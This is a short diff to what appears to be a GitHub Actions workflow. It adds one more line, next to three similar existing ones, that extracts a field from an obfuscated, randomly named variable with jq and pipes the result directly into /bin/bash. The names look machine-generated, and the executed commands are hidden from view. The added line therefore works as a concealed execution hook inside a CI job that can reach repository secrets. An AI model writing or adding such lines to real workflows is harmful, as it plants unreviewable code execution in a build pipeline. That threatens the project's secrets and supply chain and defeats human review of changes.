@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$ohge951" | jq -r .noh53784 | /bin/bash
           printf '%s' "$cswbb50516" | jq -r .dexf231 | /bin/bash
           printf '%s' "$ilzl56" | jq -r .vtnj5 | /bin/bash
+          echo $incly5146 | jq -r .zmh649 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
